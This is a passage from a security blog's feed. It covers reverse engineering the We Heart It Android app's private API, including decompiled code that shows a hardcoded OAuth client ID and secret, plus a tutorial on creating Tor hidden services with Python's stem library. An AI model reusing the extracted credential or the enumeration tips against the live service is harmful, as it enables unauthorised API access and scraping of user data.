</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>    "id": 27215547,
</span><span class='line'>    "username": "jordan_test2",
</span><span class='line'>    "name": "Jordan Test",
</span><span class='line'>    "avatar": [&lt;snip&gt;],
</span><span class='line'>    "public_account": true,
</span><span class='line'>    "verified": false,
</span><span class='line'>    "location": null,
</span><span class='line'>    "bio": null,
</span><span class='line'>    "link": null,
</span><span class='line'>    "hearts_count": 0,
</span><span class='line'>    "following_count": 1,
</span><span class='line'>    "followers_count": 2,
</span><span class='line'>    "sets_count": 0,
</span><span class='line'>    "created_at": "2014-10-12T18:38:35Z",
</span><span class='line'>    "cover": {&lt;snip&gt;}
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Great &ndash; we have an API! We could likely automate this app crawling to enumerate the available API calls and parameters. However, to get a more comprehensive idea as to what exact API endpoints are available, let&rsquo;s go straight to the source.</p>

<h3>Static Analysis</h3>

<p>Now that we have a feel of how the application operates, let&rsquo;s verify our findings by <a href="http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way/">decompiling the Android app</a> and doing some static analysis.</p>

<h4>App Structure</h4>

<p>The app has quite a few dependencies, but the core package (<code>com.weheartit</code>) is fairly straight-forward. The API we are concerned with is located at <code>com.weheartit.api</code>. Searching for the string &ldquo;/api&rdquo;, we can find that the bulk of the API functionality is found in APIRequest.java and APIRequestv2.java</p>

<h4>APIRequest.java</h4>

<p>APIRequest.java essentially contains the schema for version 1 of the OAuth enabled RESTful API. For example, we can find the OAuth <code>client_id</code> and <code>client_secret</code> parameters used by the Android app to get an access token:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">LoginServices</span> <span class="n">loginservices</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;client_id&quot;</span><span class="o">,</span> <span class="s">&quot;25ieooqr&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;client_secret&quot;</span><span class="o">,</span> <span class="s">&quot;zlype4airg41b33uwafbe8a6p8bwcgiw&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;grant_type&quot;</span><span class="o">,</span> <span class="s">&quot;password&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="s">&quot;oauth/token&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">OAuthDataResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">LoginServices</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">loginservices</span><span class="o">)));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This function is used to obtain an access token using the appropriate LoginServices call. After we have an access token associated with a <code>User</code> object, this access token is used in subsequent API requests. We can enumerate through the functions in APIRequest.java to find each of the valid API calls, as well as the arguments to each call. Here are a couple of examples (more comprehensive documentation below):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">UserSettings</span> <span class="n">usersettings</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="n">WhiSession</span><span class="o">.</span><span class="na">b</span><span class="o">();</span>
</span><span class='line'>        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="na">getAccessToken</span><span class="o">();</span>
</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&quot;ApiRequest&quot;</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;updateUserSettings() for user (&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getId</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;)&quot;</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">(</span><span class="mi">12</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[name]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getFullName</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[username]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[email]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getEmail</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[bio]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getBio</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[location]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getLocation</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[link]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getLink</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[show_unsafe_content]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUnsafeContentEnabled</span><span class="o">()));</span>
</span><span class='line'>        <span class="o">&lt;</span><span class="nl">snip:</span> <span class="n">other</span> <span class="n">settings</span><span class="o">&gt;</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;privacy_options[public]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUserPublic</span><span class="o">()));</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;privacy_options[findable]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUserFindable</span><span class="o">()));</span>
</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="s">&quot;api/settings&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">ApiOperationResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="s">&quot;Failed to update user settings&quot;</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="kt">long</span> <span class="n">l</span><span class="o">,</span> <span class="n">Long</span> <span class="n">long1</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">Object</span> <span class="n">aobj</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">3</span><span class="o">];</span>
</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">s</span><span class="o">;</span>
</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">l</span><span class="o">);</span>
</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="n">long1</span><span class="o">;</span>
</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequest&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&quot;getEntryCollectionDetails() with %s, %s, %s&quot;</span><span class="o">,</span> <span class="n">aobj</span><span class="o">));</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">long1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;heart_id&quot;</span><span class="o">,</span> <span class="n">long1</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;api/entry_sets/&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">toString</span><span class="o">(),</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">EntryListResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">c</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>APIRequestv2.java</h4>

<p>It appears as though the backend API is being upgraded to a new version, as evidenced by the existence of APIRequestv2.java. Additionally, there are some endpoints that are located at <code>/api/v2/*</code>. Here are a couple of examples:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="kt">long</span> <span class="n">l</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequestV2&quot;</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;getUserEntryCollections() with accessToken &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;, &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;, &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;page&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">i</span><span class="o">));</span>
</span><span class='line'>        <span class="n">e</span><span class="o">.</span><span class="na">a</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;api/v2/users/&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;/collections&quot;</span><span class="o">).</span><span class="na">toString</span><span class="o">(),</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">EntryCollectionListV2ResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">a</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">Long</span> <span class="n">long1</span><span class="o">,</span> <span class="n">ApiPagedResponseCallback</span> <span class="n">apipagedresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequestV2&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&quot;getUserDashboard() with %s, %d&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">s</span><span class="o">,</span> <span class="n">long1</span>
</span><span class='line'>        <span class="o">}));</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">long1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;before&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">long1</span><span class="o">));</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="n">e</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;api/v2/user/dashboard&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">UserDashboardResponseHandler</span><span class="o">(</span><span class="n">apipagedresponsecallback</span><span class="o">,</span> <span class="n">b</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>API Documentation</h3>

<p>I have created a repository, <a href="http://github.com/jordan-wright/weheartit-api">weheartit-api</a>, containing the full details found from this short study. The information in the repo is by no means comprehensive (consider it a work in progress), but it will hopefully shed some light into the available API functionality.</p>

<h3>WHI Sitemaps</h3>

<p>While on the subject of WHI, there are a couple of other interesting facts worth mentioning. For example, if your goal is to get general information about users on the network, there is no need to use the API! In fact, to help Google crawl the network, WHI publishes the following information in its <code>sitemaps</code> files:</p>

<ul>
<li>Username</li>
<li>Link to Profile</li>
<li>Date Modified</li>
<li>List of Collections</li>
</ul>


<p>You can find these files here:</p>

<ul>
<li><a href="http://sitemaps.weheartit.com/collections.xml">http://sitemaps.weheartit.com/collections.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/entry_groups.xml">http://sitemaps.weheartit.com/entry_groups.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/entries.xml">http://sitemaps.weheartit.com/entries.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/popular_images.xml">http://sitemaps.weheartit.com/popular_images.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/users.xml">http://sitemaps.weheartit.com/users.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/tags.xml">http://sitemaps.weheartit.com/tags.xml</a></li>
</ul>


<h3>Conclusion</h3>

<p>For not being exposed to developers, the API supported by WHI is surprisingly robust and complete. While this effort was simply a reverse engineering project out of curiosity, I hope that showing what the API is capable of will encourage WHI devs to open the official API to everyone.</p>

<p>As always, let me know if you have any questions or comments!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Creating Tor Hidden Services with Python]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python/"/>
    <updated>2014-10-06T20:00:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/hidden_services.png"/></p>

<h3>Introduction</h3>

<p>Tor is often used to protect the anonymity of someone who is trying to connect to a service. However, it is also possible to use Tor to protect the anonymity of a service provider via <a href="https://www.torproject.org/docs/hidden-services.html.en"><strong><em>hidden services</em></strong></a>. These services, operating under the <code>.onion</code> TLD, allow publishers to anonymously create and host content viewable only by other Tor users.</p>

<p>The Tor project has <a href="https://www.torproject.org/docs/tor-hidden-service.html.en">instructions</a> on how to create hidden services, but this can be a manual and arduous process if you want to setup multiple services. This post will show how we can use the fantastic <code>stem</code> Python library to automatically create and host a Tor hidden service.</p>

<!--more-->


<h3>Creating Hidden Services Manually</h3>

<p>The <a href="https://www.torproject.org/docs/tor-hidden-service.html.en#two">instructions provided by the Tor project</a> show that creating hidden services simply involves setting up the service locally (such as a web server listening on localhost), and then setting a few configuration options to make the service available via Tor.</p>

<p>There are two configuration settings necessary to setup a hidden service: <code>HiddenServiceDir</code>, the directory to store the <code>hostname</code> and <code>private_key</code> files, and <code>HiddenServicePort</code>, the ports used to proxy hidden service connections.</p>

<p>As the instructions show, each hidden service requires a variation of the following two lines to be present in the <code>torrc</code> configuration file (setting the directory, host, and ports appropriately):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HiddenServiceDir /path/to/store/hidden_service/
</span><span class='line'>HiddenServicePort 80 127.0.0.1:5000</span></code></pre></td></tr></table></div></figure>


<h3>A Bit About the Tor Control Protocol</h3>

<p>Changing the configuration file and restarting Tor everytime a change is needed can be a pain. Fortunately, Tor provides a way to dynamically change the running configuration using a simple text based protocol (similar to Telnet) called the Tor Control Protocol.</p>

<p>The <a href="https://gitweb.torproject.org/torspec.git?a=blob_plain;hb=HEAD;f=control-spec.txt">full specification</a> of the protocol is available, however here is a quick example of getting the valid authentication methods:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ telnet localhost 9151
</span><span class='line'>PROTOCOLINFO
</span><span class='line'>
</span><span class='line'>250-PROTOCOLINFO 1
</span><span class='line'>250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE="Tor\\control_auth_cookie"
</span><span class='line'>250-VERSION Tor="0.2.4.24"
</span><span class='line'>250 OK</span></code></pre></td></tr></table></div></figure>


<p>Other examples using this extensive protocol can be found <a href="https://www.thesprawl.org/research/tor-control-protocol/">here</a> or in the full protocol spec.</p>

<h3>Introducing Stem</h3>

<p>To make interacting with the Tor control port both easier and programmatic, the Tor project maintains a fantastic Python library called <a href="https://stem.torproject.org/">Stem</a>.</p>

<h4><code>stem.Controller</code></h4>

<p>Interaction with the Tor control port is performed using the <code>stem.Controller</code> class. Creating an instance of the class involves connecting to the port and authenticating as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from stem.control import Controller
</span><span class='line'>controller = Controller.from_port(address="127.0.0.1", port=9151)
</span><span class='line'>try:
</span><span class='line'>    controller.authenticate(password="")
</span><span class='line'>except Exception as e:
</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure>


<p>Now that we have a Controller, we can access the local configuration, pull the current descriptors for relays, and more.</p>

<p>Let&rsquo;s use the Controller to automatically set the configuration settings we saw in the previous section. When set, these configuration options will cause Tor to create the two files, <code>hostname</code> and <code>private_key</code>, necessary to run the hidden service. Here is a short script that will setup a hidden service to listen on TCP port 80 and proxy all requests to an (already established) web server listening on <a href="http://127.0.0.1:5000:">http://127.0.0.1:5000:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>host = "127.0.0.1"
</span><span class='line'>port = 5000
</span><span class='line'>hidden_svc_dir = "/tmp/hidden_service/"
</span><span class='line'>controller.set_options([
</span><span class='line'>    ("HiddenServiceDir", hidden_svc_dir),
</span><span class='line'>    ("HiddenServicePort", "80 %s:%s" % (host, str(port)))
</span><span class='line'>])
</span><span class='line'>svc_name = open(hidden_svc_dir + "/hostname", "r").read().strip()
</span><span class='line'>print "Created host: %s" % svc_name</span></code></pre></td></tr></table></div></figure>


<p>Easy as that! Now that we have the configuration setup, our service should be ready to go.</p>

<h3>An Example Service</h3>

<p>Now that we&rsquo;ve seen a little about how Stem works, here&rsquo;s an extremely basic example showing how the hidden service can be setup to work with a Flask application:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from stem.control import Controller
</span><span class='line'>from flask import Flask
</span><span class='line'>
</span><span class='line'>if __name__ == "__main__":
</span><span class='line'>
</span><span class='line'>    app = Flask("example")
</span><span class='line'>    port = 5000
</span><span class='line'>    host = "127.0.0.1"
</span><span class='line'>    hidden_svc_dir = "c:/temp/"
</span><span class='line'>
</span><span class='line'>    @app.route('/')
</span><span class='line'>    def index():
</span><span class='line'>        return "&lt;h1&gt;Tor works!&lt;/h1&gt;"
</span><span class='line'>    print " * Getting controller"
</span><span class='line'>    controller = Controller.from_port(address="127.0.0.1", port=9151)
</span><span class='line'>    try:
</span><span class='line'>        controller.authenticate(password="")
</span><span class='line'>        controller.set_options([
</span><span class='line'>            ("HiddenServiceDir", hidden_svc_dir),
</span><span class='line'>            ("HiddenServicePort", "80 %s:%s" % (host, str(port)))
</span><span class='line'>            ])
</span><span class='line'>        svc_name = open(hidden_svc_dir + "/hostname", "r").read().strip()
</span><span class='line'>        print " * Created host: %s" % svc_name
</span><span class='line'>    except Exception as e:
</span><span class='line'>        print e
</span><span class='line'>    app.run()</span></code></pre></td></tr></table></div></figure>


<p>Here&rsquo;s what this looks like in action:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>C:\&gt;python tor_example.py
</span><span class='line'> * Getting controller
</span><span class='line'> * Created host: 4yrbax6gwnemqh7n.onion
</span><span class='line'> * Running on http://127.0.0.1:5000/</span></code></pre></td></tr></table></div></figure>


<p><img src="http://jordan-wright.github.io/images/blog/hidden_services/screenshot.png"/></p>

<h3>Caveats</h3>

<p>It is important to note that the security of the hidden service depends on protecting the location of the server. To do this, consider ways to prevent leaking the real server IP through debug messages, etc. There has been some <a href="https://news.ycombinator.com/item?id=8404511">great discussion</a> on the topic that might be worth looking into.</p>

<h3>Conclusion</h3>

<p>Hidden services deliver freedom of speech and the free exchange of ideas without censorship. By using Stem Python library, it&rsquo;s possible to take the pain out of manual configuration and instead programmatically create and manage multiple hidden services.</p>

<p>As always, let me know if you have any questions or comments.</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Decompiling Android Apps the Easy Way]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way/"/>
    <updated>2014-08-10T19:51:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/android_apps.png"/></p>

